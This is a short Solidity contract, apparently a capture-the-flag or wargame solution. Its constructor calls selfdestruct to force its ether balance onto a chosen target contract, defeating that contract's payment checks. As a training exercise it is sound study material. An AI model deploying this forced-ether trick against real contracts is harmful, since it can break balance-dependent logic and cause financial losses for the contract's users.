//SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

// import "hardhat/console.log";

contract N2WeirdoHack {

  address public target;
  constructor(address _target) payable {
  // Complete with your own code
  target = _target;
  selfdestruct(payable(target));
  }
}
